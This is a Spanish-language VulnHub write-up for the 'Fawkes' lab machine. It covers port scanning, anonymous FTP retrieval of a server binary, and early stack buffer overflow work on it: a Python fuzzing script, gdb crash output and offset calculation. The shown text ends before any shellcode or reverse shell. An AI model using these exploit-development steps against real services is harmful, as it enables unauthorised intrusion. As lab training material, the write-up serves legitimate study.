---
title: "Fawkes - VulnHub"
date: 2024-11-17
draft: false
slug: "vulnhub-wirteup-fawkes"
excerpt: "Es una máquina algo complicada. Analizando los puertos activos, vemos uno en especial que resulta ser un servidor ejecutado por un binario que obtenemos del servicio FTP. Analizamos y hacemos pruebas de las funciones del binario, descubriendo que es vulnerable a Buffer Overflow, por lo que seguimos varios pasos para crear un script que, al ejecutarlo, obtenga una Reverse Shell de la máquina víctima. Dentro, descubrimos que se trata de un contenedor de Docker que está activo en el puerto 2222. Enumerando un poco, encontramos las credenciales de un usuario y una nota donde se nos indica que debemos analizar el tráfico de la red de la máquina. Haciendo lo pedido, obtenemos las credenciales de otro usuario, que nos permiten conectarnos al servicio SSH del puerto 22. Volviendo a enumerar, descubrimos el binario sudo con permisos SUID, pero al no hallar una forma de aprovecharnos de este, buscamos un Exploit para la versión de este binario y encontramos el CVE-2021-3156, que nos permite escalar privilegios para ser Root."
categories: ["VulnHub", "Hard Machine"]
tags: ["Linux", "FTP", "SSH", "MonkeyCom", "FTP Enumeration", "Buffer Overflow", "Buffer Overflow (x32) Stack Based", "SSH Enumeration", "Abusing Sudoers Privilege", "Trafic Analysis", "Heap-Based Buffer Overflow in Sudo (CVE-2021-3156)", "Privesc - CVE-2021-3156", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ftp"
  - "file"
  - "strings"
  - "strace"
  - "grep"
  - "chmod"
  - "nc"
  - "python3"
  - "gdb"
  - "pattern create"
  - "pattern offset"
  - "wc"
  - "msfvenom"
  - "nasm_shell"
  - "objdump"
  - "ssh"
  - "ifconfig"
  - "sudo"
  - "tcpdump"
  - "which"
  - "find"
  - "wget"
  - "scp"
  - "base64"
links:
  - "https://serverfault.com/questions/189144/what-is-monkeycom-on-port-9898"
  - "https://keepcoding.io/blog/que-es-un-buffer-overflow/"
  - "https://www.fortinet.com/lat/resources/cyberglossary/buffer-overflow"
  - "https://www.cloudflare.com/es-es/learning/security/threats/buffer-overflow/"
  - "https://www.gdbtutorial.com/tutorial/commands"
  - "https://github.com/hugsy/gef"
  - "https://stackoverflow.com/questions/46631666/how-i-can-to-capture-ftp-data-packets-via-tcpdump"
  - "https://github.com/0xdevil/CVE-2021-3156"
  - "https://github.com/worawit/CVE-2021-3156"
showtoc: true
header:
  teaser: "/assets/images/vulnhub-writeup-fawkes/Fawkes3.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.007
PING 192.168.1.007 (192.168.1.007) 56(84) bytes of data.
64 bytes from 192.168.1.007: icmp_seq=1 ttl=64 time=2.02 ms
64 bytes from 192.168.1.007: icmp_seq=2 ttl=64 time=0.754 ms
64 bytes from 192.168.1.007: icmp_seq=3 ttl=64 time=0.969 ms
64 bytes from 192.168.1.007: icmp_seq=4 ttl=64 time=0.781 ms

--- 192.168.1.007 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3027ms
rtt min/avg/max/mdev = 0.754/1.130/2.017/0.518 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.007 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 15:26 CST
Initiating ARP Ping Scan at 15:26
Scanning 192.168.1.007 [1 port]
Completed ARP Ping Scan at 15:26, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:26
Scanning 192.168.1.007 [65535 ports]
Discovered open port 21/tcp on 192.168.1.007
Discovered open port 22/tcp on 192.168.1.007
Discovered open port 80/tcp on 192.168.1.007
Discovered open port 2222/tcp on 192.168.1.007
Discovered open port 9898/tcp on 192.168.1.007
Completed SYN Stealth Scan at 15:26, 5.64s elapsed (65535 total ports)
Nmap scan report for 192.168.1.007
Host is up, received arp-response (0.00053s latency).
Scanned at 2024-11-17 15:26:53 CST for 6s
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 64
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
9898/tcp open  monkeycom    syn-ack ttl 63
MAC Address: 08:00:27:95:0B:C6 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.88 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo varios puertos abiertos, pero se me hace curioso ver el **servicio FTP y 2 servicios SSH** (puerto 21 y puerto 2222). Además, nunca había visto el puerto 9898 en otras máquinas.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,22,80,2222,9898 192.168.1.007 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 15:27 CST
Nmap scan report for 192.168.1.007
Host is up (0.00066s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:Tu_IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))

|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh        OpenSSH 8.4 (protocol 2.0)

| ssh-hostkey: 
|   3072 c4:1d:d5:66:85:24:57:4a:86:4e:d9:b6:00:69:78:8d (RSA)
|   256 0b:31:e7:67:26:c6:4d:12:bf:2a:85:31:bf:21:31:1d (ECDSA)
|_  256 9b:f4:bd:71:fa:16:de:d5:89:ac:69:8d:1e:93:e5:8a (ED25519)
9898/tcp open  monkeycom?

| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Welcome to Hogwart's magic portal
|     Tell your spell and ELDER WAND will perform the magic
|     Here is list of some common spells:
|     Wingardium Leviosa
|     Lumos
|     Expelliarmus
|     Alohomora
|     Avada Kedavra 
|     Enter your spell: Magic Output: Oops!! you have given the wrong spell
|     Enter your spell:
|   NULL: 
|     Welcome to Hogwart's magic portal
|     Tell your spell and ELDER WAND will perform the magic
|     Here is list of some common spells:
|     Wingardium Leviosa
|     Lumos
|     Expelliarmus
|     Alohomora
|     Avada Kedavra 
|_    Enter your spell:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9898-TCP:V=7.94SVN%I=7%D=11/17%Time=673A5FC2%P=x86_64-pc-linux-gnu%
SF:r(NULL,DE,"Welcome\x20to\x20Hogwart's\x20magic\x20portal\nTell\x20your\
SF:x20spell\x20and\x20ELDER\x20WAND\x20will\x20perform\x20the\x20magic\n\n
SF:Here\x20is\x20list\x20of\x20some\x20common\x20spells:\n1\.\x20Wingardiu
SF:m\x20Leviosa\n2\.\x20Lumos\n3\.\x20Expelliarmus\n4\.\x20Alohomora\n5\.\
SF:x20Avada\x20Kedavra\x20\n\nEnter\x20your\x20spell:\x20")%r(GenericLines
SF:,125,"Welcome\x20to\x20Hogwart's\x20magic\x20portal\nTell\x20your\x20sp
SF:ell\x20and\x20ELDER\x20WAND\x20will\x20perform\x20the\x20magic\n\nHere\
SF:x20is\x20list\x20of\x20some\x20common\x20spells:\n1\.\x20Wingardium\x20
SF:Leviosa\n2\.\x20Lumos\n3\.\x20Expelliarmus\n4\.\x20Alohomora\n5\.\x20Av
SF:ada\x20Kedavra\x20\n\nEnter\x20your\x20spell:\x20Magic\x20Output:\x20Oo
SF:ps!!\x20you\x20have\x20given\x20the\x20wrong\x20spell\n\nEnter\x20your\
SF:x20spell:\x20")%r(GetRequest,125,"Welcome\x20to\x20Hogwart's\x20magic\x
SF:20portal\nTell\x20your\x20spell\x20and\x20ELDER\x20WAND\x20will\x20perf
SF:orm\x20the\x20magic\n\nHere\x20is\x20list\x20of\x20some\x20common\x20sp
SF:ells:\n1\.\x20Wingardium\x20Leviosa\n2\.\x20Lumos\n3\.\x20Expelliarmus\
SF:n4\.\x20Alohomora\n5\.\x20Avada\x20Kedavra\x20\n\nEnter\x20your\x20spel
SF:l:\x20Magic\x20Output:\x20Oops!!\x20you\x20have\x20given\x20the\x20wron
SF:g\x20spell\n\nEnter\x20your\x20spell:\x20")%r(HTTPOptions,125,"Welcome\
SF:x20to\x20Hogwart's\x20magic\x20portal\nTell\x20your\x20spell\x20and\x20
SF:ELDER\x20WAND\x20will\x20perform\x20the\x20magic\n\nHere\x20is\x20list\
SF:x20of\x20some\x20common\x20spells:\n1\.\x20Wingardium\x20Leviosa\n2\.\x
SF:20Lumos\n3\.\x20Expelliarmus\n4\.\x20Alohomora\n5\.\x20Avada\x20Kedavra
SF:\x20\n\nEnter\x20your\x20spell:\x20Magic\x20Output:\x20Oops!!\x20you\x2
SF:0have\x20given\x20the\x20wrong\x20spell\n\nEnter\x20your\x20spell:\x20"
SF:)%r(RTSPRequest,125,"Welcome\x20to\x20Hogwart's\x20magic\x20portal\nTel
SF:l\x20your\x20spell\x20and\x20ELDER\x20WAND\x20will\x20perform\x20the\x2
SF:0magic\n\nHere\x20is\x20list\x20of\x20some\x20common\x20spells:\n1\.\x2
SF:0Wingardium\x20Leviosa\n2\.\x20Lumos\n3\.\x20Expelliarmus\n4\.\x20Aloho
SF:mora\n5\.\x20Avada\x20Kedavra\x20\n\nEnter\x20your\x20spell:\x20Magic\x
SF:20Output:\x20Oops!!\x20you\x20have\x20given\x20the\x20wrong\x20spell\n\
SF:nEnter\x20your\x20spell:\x20");
MAC Address: 08:00:27:95:0B:C6 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.23 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que para el **servicio FTP** tenemos activo el **usuario anonymous**, pero me intriga el resultado del puerto 9898, pues parecen comandos que puedes usar para comunicarte o para realizar una acción.

Vamos a ir primero por la web y luego al **servicio FTP**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/vulnhub-writeup-fawkes/Captura1.png">
</p>

Igual que en las máquinas anteriores, solamente una imagen.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-fawkes/Captura2.png">
</p>

No mucho.

Te diría que aplicáramos **Fuzzing** para ver qué podemos encontrar, pero no encontraremos nada, así que vamos a entrar al **servicio FTP**.

### Enumerando de Servicio FTP {#FTP}

Entremos usando el **usuario anonymous**:
```batch
ftp 192.168.1.007
Connected to 192.168.1.007.
220 (vsFTPd 3.0.3)
Name (192.168.1.007:berserkwings): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||33401|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
226 Directory send OK.
ftp> get server_hogwarts
local: server_hogwarts remote: server_hogwarts
229 Entering Extended Passive Mode (|||38203|)
150 Opening BINARY mode data connection for server_hogwarts (705996 bytes).
100% |******************************|   689 KiB   26.28 MiB/s    00:00 ETA
226 Transfer complete.
705996 bytes received in 00:00 (25.07 MiB/s)
ftp> exit
221 Goodbye.
```

Encontramos únicamente un archivo y lo descargamos en nuestra máquina.

Con el comando **file**, podemos ver qué clase de archivo es:
```bash
file server_hogwarts
server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped
```
Parece ser un binario de **Linux** y tiene una arquitectura de **32 bits (x86)**.

Si lo analizamos con el comando **strings**, veremos dentro de todo el resultado algunas funciones del **lenguaje C**.

Esto ya nos puede dar una pista de a que nos enfrentamos, pues puede ser que debamos aplicar **Buffer Overflow**.

### Analizando Binario y Probando su Funcionamiento {#Binario}

Primero, ¿qué es un **Buffer Overflow**?

| **Buffer Overflow** |
|:-----------:|
| *El desbordamiento del búfer es una anomalía que se produce cuando el software que escribe datos en un búfer desborda la capacidad del búfer, lo que provoca que se sobrescriban las ubicaciones de memoria adyacentes. En otras palabras, se pasa demasiada información a un contenedor que no cuenta con el espacio suficiente, y esa información acaba sustituyendo a los datos de los contenedores adyacentes. Los atacantes pueden aprovecharse de los desbordamientos del búfer con el objetivo de modificar la memoria de un ordenador para socavar o tomar el control de la ejecución del programa.* |

Existen algunas funciones comunes que pueden indicar que un binario es vulnerable a **Buffer Overflow**. Estas son:
* `gets()`: No verifica los límites del buffer.
* `strcpy(), strcat()`: Copian cadenas sin verificar.
* `scanf()` con especificadores `%s` sin límites.

Podemos buscarlas con **grep** al usar el comando **strings**:
```bash
strings server_hogwarts | grep "strcpy"
strcpy.o
strcpy_ifunc
strcpy
__strcpy_ia32
__strcpy_ssse3
__strcpy_sse2
```
Encontramos la función `strcpy()`.

Además, con la herramienta **strace** podemos analizar el binario, ya que permite rastrear las llamadas al sistema (**syscalls**) y las señales realizadas por un programa o proceso.

Para esto, debemos darle permisos de ejecución al binario y luego usamos la herramienta **strace**:
```bash
chmod +x server_hogwarts
strace ./server_hogwarts
execve("./server_hogwarts", ["./server_hogwarts"], 0x7fffea0ff4d0 /* 37 vars */) = 0
[ Process PID=27474 runs in 32 bit mode. ]
brk(NULL)                               = 0x92c3000
brk(0x92c37c0)                          = 0x92c37c0
set_thread_area({entry_number=-1, base_addr=0x92c32c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
uname({sysname="Linux", nodename="kali-berserkwings", ...}) = 0
readlink("/proc/self/exe", "/home/..."..., 4096) = 65
brk(0x92e47c0)                          = 0x92e47c0
brk(0x92e5000)                          = 0x92e5000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEPORT, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(9898), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 3)                            = 0
accept(3, ^C0xffdf4184, [16])             = ? ERESTARTSYS (To be restarted if SA_RESTART is set)
strace: Process 27474 detached
```
Parece que el binario ejecuta un proceso usando nuestra IP y el **puerto 9898**. Por lo que entiendo, el binario está funcionando como un servidor, así que podemos conectarnos a este con **netcat**.

Recordando el escaneo, vimos que estaba usando el **puerto 9898**, así que posiblemente están usando esté mismo binario.

Vamos a conectarnos a la máquina víctima en su puerto 9898 con **netcat**:
```bash
nc 192.168.1.007 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: Wingardium Leviosa
Magic Output: You have successfully leviate the object

Enter your spell: Lumos
Magic Output: Entire surrounding is illuminated

Enter your spell: Expelliarmus
Magic Output: Your opponent is disarmed

Enter your spell: Alohomora
Magic Output: All the doors are unlocked

Enter your spell: Avada Kedavra
Magic Output: This spell is black magic and is forbidden in hogwarts

Enter your spell: ^C
```
Pudimos ejecutar hechizos.

Entonces, si usamos el binario y nos conectamos con **netcat** a nuestra propia IP, deberíamos ver lo mismo.

Probémoslo:
* Terminal 1 - **Binario**:
```bash
./server_hogwarts
```

* Terminal 2 - **netcat**:

```bash
nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: Lumos
Magic Output: Entire surrounding is illuminated

Enter your spell: 
```

Excelente, podemos hacer nuestras pruebas con el binario descargado.

La primera que haremos, será usar un montón de **A's** para romper el funcionamiento del binario y ver qué es lo que pasa.

Con el siguiente comando de **Python**, creamos **200 A's** que vamos a usar:
```bash
python3 -c 'print("A" * 200)'
AAAAA...
```

Vuelve a ejecutar el binario y aplica las A's. Observa la respuesta que obtuvimos:
```bash
/server_hogwarts
zsh: segmentation fault  ./server_hogwarts
```
Hemos crasheado el binario y obtuvimos el mensaje **segmentation fault**, que es un indicativo más de un posible **Buffer Overflow**.

## Explotación de Vulnerabilidades {#Explotacion}

### Proceso para Aplicar Buffer Overflow {#BufferOverflow}

Para que podamos aplicar **Buffer Overflow**, es necesario que conozcamos ciertos conceptos y pasos a seguir.

Estos son los pasos que yo considero, son los que se deben aplicar para realizar un **Buffer Overflow**:
* **Primero**: Identificar si un archivo encontrado es un binario.
* **Segundo**: Estudiar y analizar su funcionamiento.
* **Tercer**: Confirmar vulnerabilidad con herramienta **gdb**.
* **Cuarto**: Aplicar Fuzzing para detectar límites del binario.
* **Quinto**: Identificar el **offset**.
* **Sexto**: Identificar en qué parte de la memoria se están representando los caracteres introducidos.
* **Séptimo**: Creación de Shellcode malicioso y creación de Exploit.
* **Octavo**: Búsqueda de **OpCode JMP ESP**.
* **Noveno**: Aplicación de NOPs y/o desplazamiento de pila.
* **Décimo**: Prueba y ejecución de Exploit.

Acá te dejo unos links con buena información sobre **Buffer Overflow**:
* <a href="https://keepcoding.io/blog/que-es-un-buffer-overflow/" target="_blank">¿Qué es un buffer overflow?</a>
* <a href="https://www.fortinet.com/lat/resources/cyberglossary/buffer-overflow" target="_blank">Desbordamiento de búfer</a>
* <a href="https://www.cloudflare.com/es-es/learning/security/threats/buffer-overflow/" target="_blank">¿Qué es el desbordamiento del búfer?</a>

Para este punto, ya hemos completado el punto 1 y 2, así que sigamos con los otros 3.

#### Tercer Paso: Confirmando Buffer Overflow con gdb {#Confirmacion}

En mi caso, seguí esta guía para instalar la herramienta **gdb**:
<a href="https://www.gdbtutorial.com/tutorial/how-install-gdb" target="_blank">Guide to use GDB and learn debugging techniques: How to Install GDB?</a>

Y le instale la siguiente expansión para mejorar la herramienta **gdb**:
<a href="https://github.com/hugsy/gef" target="_blank">Repositorio de hugsy: gef</a>

Una vez que los tengas instalados, vamos a ejecutar **gdb** junto al binario:
```bash
gdb -q ./server_hogwarts
```

Hay muchos comandos que podemos usar dentro de **gdb** y aún más con la expansión que añadimos.

Por ejemplo, podemos analizar la seguridad del binario con `checksec`:
```bash
gef➤  checksec
[+] checksec for '/home/berserkwings/Desktop/VulnHub/Fawkes/content/server_hogwarts'
Canary                        : ✓ (value: 0xf4fcd700)
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```
Esto es otro indicativo de que el binario es bastante vulnerable a **Buffer Overflow**, ya que no tiene la suficiente seguridad.

Investiguemos que es **Canary**.

| **stack canary** |
|:-----------:|
| *Un stack canary es un valor especial que se coloca en la pila (stack) para detectar sobrescrituras. Esto significa que, si intentas sobrescribir datos en la pila, como el EIP, primero tendrías que evitar alterar su valor. Si el canario cambia, el programa detectará el ataque y terminará.* |

Ahora, vayamos al siguiente paso.

#### Cuarto Paso: Aplicando Fuzzing al Binario {#fuzzingBinario}

Esta parte es esencial para identificar los límites del binario o aplicación, introduciendo varias cantidades de caracteres hasta que falle.

Esto ya lo hicimos, pero aquí te dejo un script de **Python** que puedes usar para introducir la cantidad de caracteres que quieras (este script puede servir para otros casos de **Buffer Overflow**, aunque depende de cada caso).

El script lo llamé **spiker.py**:
```python
#!/usr/bin/python3
import socket
import argparse

def parse_arguments():
        parser = argparse.ArgumentParser(description="Script para fuzzear monkeycom")
        parser.add_argument("--ip_addr", required=True, help="Dirección IP a utilizar")
        parser.add_argument("--port", type=int, required=True, help="Puerto a utilizar")
        parser.add_argument("--length", type=int, required=True, help="Cantidad de A's a enviar")
        return parser.parse_args()

def exploit(ip, port, length):
        try:
                # Creando conexión vía TCP/IP
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print(f"\n[+] Conectando a {ip}:{port}...\n")
                s.connect((ip, port))

                # Recibiendo banner
                banner = s.recv(1024)
                print(f"\n[+] Recibiendo Banner: \n------\n{banner.decode('utf-8', errors='ignore')}\n------\n")

                # Creando y enviando payload
                payload = b"A" * length + b'\r\n'
                print(f"[*] Payload Enviado: {payload}\n")
                s.send(payload)

                # Recibiendo respuesta
                response = s.recv(1024)
                if response:
                        print(f"\n[+] Respuesta del servidor: {response.decode('utf-8', errors='ignore')}\n")
                else:
                        print(f"\n[!] Sin respuesta.")

        # Manejo de errores
        except socket.error as e:
                print(f"[!] Error de conexión: {e}")

        except Exception as e:
                print(f"[!] Ocurrio un error: {e}")

        # Cerrando la conexión
	finally:
                s.close()
                print("\n[+] Cerrando conexión.")

if __name__ == '__main__':
        args = parse_arguments()
        exploit(args.ip_addr, args.port, args.length)
```
Es muy simple su uso, debes indicarle la IP, el puerto y la cantidad de caracteres a enviar. Los caracteres que se van a enviar son **A's** solamente.

Puedes probarlo contra el binario o hacerlo manualmente.

Para ejecutar el binario, usamos solamente la letra **r**:
```bash
gef➤  r
Starting program: ../Fawkes/content/server_hogwarts
```

Como ya está iniciado, vamos a enviar el mismo payload de **200 A's** y observamos la respuesta que nos dé **gdb**:
```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcbbc  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffce40  →  0x0000000a ("\n"?)
$edx   : 0xffffcc84  →  0x0000000a ("\n"?)
$esp   : 0xffffcc30  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x080b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd178  →  "\nEnter your spell: "
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc30│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $esp
0xffffcc34│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc38│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc3c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc40│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc44│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc48│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc4c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x41414141 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
```
Con **200 A's** es suficiente para que el binario deje de funcionar, pero pueden ser menos y es lo que debemos identificar.

#### Quinto Paso: Obteniendo el offset {#offset}

Desde aquí, podemos identificar el **offset que es el número exacto de bytes que necesitas para sobrescribir el EIP**.

Para esto, podemos generar un patrón de distintos caracteres para que sea más fácil identificar el **offset**.

Desde **gdb**, usamos el comando **pattern create** para que nos dé 1024 caracteres que podamos usar: 
```bash
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa...
```

Ahora, ejecutamos el binario con **r** y enviamos los caracteres que tenemos:
```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcbbc  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffd180  →  "our spell: "
$edx   : 0xffffcfc4  →  "our spell: "
$esp   : 0xffffcc30  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0x080b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd178  →  "\nEnter your spell: "
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc30│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"    ← $esp
0xffffcc34│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffcc38│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffcc3c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffcc40│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffcc44│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffcc48│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffcc4c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x62616164 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
```
Observa el **EIP**, se pueden ver letras específicas que podemos identificar de todo el payload.

Lo podemos hacer manualmente de la siguiente manera:

* Copia el payload y dentro de tu terminal, úsalo dentro de **echo** y con **grep** busca las 4 letras que están en el **EIP**:
```bash
echo -n "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa..." | grep "daab"
```

* Ya identificado, copia hasta donde indicó el comando anterior e igual úsalo dentro de **echo** y usa `wc -c` para obtener la cantidad de letras:
```bash
echo -n "aaaabaaacaaadaaaeaaafaa..." | wc -c
116
```
Si quitamos los 4 caracteres que buscamos, sería un total de **112 el offset**.

También lo podemos hacer de forma sencilla con el comando `pattern offset $eip`:
```bash
gef➤  pattern offset $eip
